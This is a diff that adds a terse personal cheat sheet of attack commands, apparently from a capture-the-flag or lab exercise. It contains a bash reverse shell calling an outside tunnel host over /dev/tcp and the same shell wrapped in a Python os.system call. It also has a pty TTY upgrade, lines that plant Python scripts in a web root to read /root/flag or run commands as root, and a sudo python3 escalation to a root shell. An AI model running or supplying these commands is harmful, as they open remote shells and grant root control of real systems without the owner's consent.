@@ -1,0 +1,13 @@
+tcp-free.tunnel4.com:32901
+/bin/bash -c "bash -i >& /dev/tcp/tcp-free.tunnel4.com/32937 0>&1"
+
+tty upgrade : python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+@
+import os; os.system('/bin/bash -c "bash -i >& /dev/tcp/tcp-free.tunnel4.com/32937 0>&1"')
+echo  "import os; os.system('cat /root/flag')" > /var/www/html/somescript.py
+
+echo "import subprocess; cmd = ['id']; subprocess.Popen(cmd, shell=True, user='root')" > /var/www/html/somescript.py
+
+
+sudo /usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
